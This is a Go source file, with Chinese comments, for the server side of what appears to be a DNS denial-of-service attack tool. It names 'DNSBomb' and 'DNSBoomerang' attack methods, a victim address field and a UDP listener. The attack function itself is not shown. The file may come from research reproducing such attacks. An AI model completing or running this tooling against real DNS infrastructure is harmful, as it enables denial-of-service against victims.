package server

import(
	"fmt"
	"net"

)


type Server struct {
	Method		        string			// 攻击方法
	SrcIP				string			// 源地址
	DstIP				string			// 受害者地址
}

type serverMethod func(s *Server) ()

var serverMethods = map[string]serverMethod{
	"DNSBoomerang":       (*Server).queryAggregation,
    "DNSBomb":            (*Server).queryAggregation,
}

func (s *Server) Start() {
	// 根据攻击方法获取攻击函数
	method, exists := serverMethods[s.Method]
	if !exists {
		fmt.Printf("不支持的攻击方法: %v\n", s.Method)
		return
	}
	method(s)
}

// ListenUDP 监听指定IP和端口并将接收到的 应用层载荷 传入通道中
func ListenUDP(ip string, port int, messageChan chan<- Message) {
    addr := net.UDPAddr{
        Port: port,
        IP:   net.ParseIP("0.0.0.0"),
    }

    conn, err := net.ListenUDP("udp", &addr)
    if err != nil {
        fmt.Printf("启动 UDP 监听失败: %v\n", err)
        close(messageChan)
        return
    }
    defer conn.Close()
    fmt.Printf("UDP 监听已启动，端口号: %d\n", port)

    buffer := make([]byte, 4096)
    for {
        n, clientAddr, err := conn.ReadFromUDP(buffer)
        if err != nil {
            fmt.Printf("接收 UDP 报文时出错: %v\n", err)
            continue
        }

        // 判断客户端IP是否匹配指定的IP
        if clientAddr.IP.String() != ip {
            fmt.Printf("来自非指定IP地址 (%s) 的UDP报文被丢弃\n", clientAddr.IP.String())
            continue
        }

        // 封装数据
        message := Message{
            Payload: append([]byte(nil), buffer[:n]...), // 拷贝数据
            SrcPort: clientAddr.Port,
        }

        messageChan <- message // 发送封装后的数据
    }
}


